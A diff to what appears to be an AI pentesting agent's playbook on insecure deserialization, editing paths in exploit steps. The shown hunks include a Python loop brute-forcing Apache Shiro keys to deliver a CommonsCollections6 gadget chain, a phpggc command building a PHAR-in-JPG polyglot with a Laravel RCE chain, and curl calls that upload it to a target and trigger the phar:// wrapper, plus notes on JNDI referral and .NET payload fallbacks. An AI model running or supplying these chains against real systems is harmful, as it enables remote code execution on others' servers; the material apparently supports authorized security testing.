@@ -95,7 +95,7 @@ Pick the per-language track that matches the runtime. Each track follows the sam
    execute_code language="python" code="""
 import base64, requests, subprocess
 from Crypto.Cipher import AES
-KEYS = open('/opt/keys/shiro_keys.txt').read().splitlines()  # public Shiro key list
+KEYS = [l.split(':')[0] for l in open('/root/nuclei-templates/helpers/wordlists/shiro_encrypted_keys.txt').read().splitlines() if l]  # public Shiro keys (nuclei list, key:sample per line)
 chain = open('/tmp/cc6.bin','rb').read()
 for k in KEYS:
     key = base64.b64decode(k)
@@ -136,7 +136,7 @@ print(r.status_code, r.headers, r.text[:300])
    ```
 3. **PHAR polyglot via file uploader.** When unserialize is not directly reachable but a `file_exists()` / `fopen()` / `getimagesize()` / `is_file()` call accepts a path of the form `phar://uploads/x.jpg`, smuggle a PHAR inside a JPG and trigger the `phar://` wrapper:
    ```
-   kali_shell command="phpggc -p phar -pj /opt/phpggc/example.jpg -o /tmp/poly.jpg Laravel/RCE9 system 'id > /tmp/o'"
+   kali_shell command="phpggc -p phar -pj /usr/local/go/src/image/testdata/video-001.jpeg -o /tmp/poly.jpg Laravel/RCE9 system 'id > /tmp/o'"
    execute_curl url="https://target.tld/upload" method="POST" headers='{"Content-Type":"multipart/form-data"}' multipart_files='[{"name":"avatar","filename":"poly.jpg","content_path":"/tmp/poly.jpg","content_type":"image/jpeg"}]'
    execute_curl url="https://target.tld/profile?avatar=phar:///var/www/uploads/<RETURNED_PATH>/poly.jpg/test"
    ```
@@ -252,6 +252,6 @@ For each landed gadget, capture:
 - **Do not run Java gadget chains under load.** `CommonsCollections6` invokes `LazyMap.get` paths that can pin a worker thread; one shot per minute is plenty for confirmation.
 - **PHAR delivery rewrites disk on the target.** Track the path of every uploaded PHAR/JPG so cleanup actually removes them. Some sinks rename uploads; capture the server-side path from the response.
 - **`marshalsec` and `ysoserial.net` are not in the Kali image** (build complexity vs image size). Fallbacks: for marshalsec-style JNDI referral servers, stand up an ad-hoc LDAP referral with `execute_code` + the `ldap3` library; for `ysoserial.net`, hand-craft `TextFormattingRunProperties` XAML inside `execute_code` and frame it manually with LosFormatter byte structure (binary frame is documented in the YSoSerial.NET README).
-- **`phpggc` requires PHP CLI on the sandbox.** Already installed via the Kali Dockerfile; if a future image strips `php-cli`, the chain step blocks and the agent must fall back to copying a pre-baked chain from `/opt/phpggc/phpggc.cache/` or generating it offline.
+- **`phpggc` requires PHP CLI on the sandbox.** The Kali image ships it (`php`); if a future image strips it, the chain step blocks and the agent must generate the chain offline.
 - **Polymorphic-typing payloads (Jackson / FastJSON / JSON.NET) are still deserialization** even though the wire format is JSON. The classification belongs here, not in api_testing.
 - **Useful references:** Frohoff & Lawrence original "Marshalling Pickles" (AppSecCali 2015), AmbionicsSecurity phpggc README, PortSwigger "Exploiting deserialization vulnerabilities in Java" (2017), `pwntools` `flatten` for non-stream Python primitives, LiveOverflow PHAR polyglot writeups, Alvaro Munoz "Friday the 13th: JSON Attacks" (Black Hat USA 2017) for .NET typing chains, and the CVE listings around CommonsCollections (CVE-2015-7501), Apache Shiro (CVE-2016-4437), Telerik UI (CVE-2017-9248, CVE-2019-18935), Spring4Shell (CVE-2022-22965), and Log4Shell (CVE-2021-44228).
